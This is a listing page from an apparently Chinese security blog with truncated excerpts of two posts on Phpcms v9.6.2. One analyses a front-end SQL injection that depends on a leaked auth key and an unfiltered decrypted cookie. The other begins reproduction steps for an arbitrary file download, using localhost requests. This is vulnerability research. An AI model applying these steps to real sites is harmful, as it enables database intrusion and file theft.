        <h1 id="Phpcms-v9-6-2-前台sql注入"><a href="#Phpcms-v9-6-2-前台sql注入" class="headerlink" title="Phpcms v9.6.2 前台sql注入"></a>Phpcms v9.6.2 前台sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms v9.6.2</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个版本的的注入，是建立在任意文件读取漏洞存在的情况下才可利用。通过任意文件读取漏洞获得加解密的<br><strong>key</strong> 值，我们可以用这个 <strong>key</strong> 加密我们的 <strong>SQL注入payload</strong><br>。由于程序对解密后的数据并未过滤，最终导致漏洞发生。严格上来讲<br><strong>v9.6.2</strong> 版本的注入只能在 <strong>windows</strong><br>上利用，具体原因在上面的任意文件读取漏洞分析时也说了。下面我们来具体分析一下这个漏洞。</p>
<p>漏洞文件位于 <strong>phpcms/modules/member/classes/foreground.class.php</strong><br>，代码如下图。我们可以明显看到下图第33行，程序直接将解密后的数据未经过滤直接带入查询。而待解密数据<br><strong>$phpcms_auth</strong> 和解密秘钥 <strong>$auth_key</strong> 均可构造。</p>
<p><img src="/resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId25.png"></p>
<p>我们先来看一下待解密数据 <strong>$phpcms_auth</strong><br>如何构造。从下图中，可以看出程序将从 <strong>cookie</strong> 中的 <strong>xxx_auth</strong><br>字段经过 <strong>sys_auth</strong> 函数解密后，返回给了 <strong>$phpcms_auth</strong><br>，而默认情况下使用 <strong>pc_base::load_config(&#39;system&#39;, &#39;auth_key&#39;)</strong><br>作为加解密的 <strong>key</strong> 值。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.2%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20v9.6.2%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" data-id="cl5c2qu5t00e2y8v17fvf0v3i" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Phpcms/Phpcms v9.6.2 任意文件下载" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="article-date">
  <time datetime="2022-07-08T06:26:01.731Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Phpcms-v9-6-2-任意文件下载"><a href="#Phpcms-v9-6-2-任意文件下载" class="headerlink" title="Phpcms v9.6.2 任意文件下载"></a>Phpcms v9.6.2 任意文件下载</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h5 id="第一步-进行如下请求获得YDVIB-siteid的值。"><a href="#第一步-进行如下请求获得YDVIB-siteid的值。" class="headerlink" title="第一步:进行如下请求获得YDVIB_siteid的值。"></a>第一步:进行如下请求获得YDVIB_siteid的值。</h5><p>请求：</p>
<pre><code>[GET]http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1
</code></pre>
<p>获得：</p>
<pre><code>[cookie]YDVIB_siteid:75d1XCnlbSh-1zi2xZ-gearAbSsmOcXypuSKXZst
</code></pre>
<h5 id="第二步-在-POST-DATA-中的userid-flash参数的值设置为，第一步请求得到的YDVIB-siteid参数的值，并进行如下请求。"><a href="#第二步-在-POST-DATA-中的userid-flash参数的值设置为，第一步请求得到的YDVIB-siteid参数的值，并进行如下请求。" class="headerlink" title="第二步:在[POST DATA] 中的userid_flash参数的值设置为，第一步请求得到的YDVIB_siteid参数的值，并进行如下请求。"></a>第二步:在[POST DATA] 中的userid_flash参数的值设置为，第一步请求得到的YDVIB_siteid参数的值，并进行如下请求。</h5>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20v9.6.2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" data-id="cl5c2qu5u00e3y8v1hxt9dt53" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/50/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/49/">49</a><a class="page-number" href="/page/50/">50</a><span class="page-number current">51</span><a class="page-number" href="/page/52/">52</a><a class="page-number" href="/page/53/">53</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/52/">下一页</a>
    </nav>
  
</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>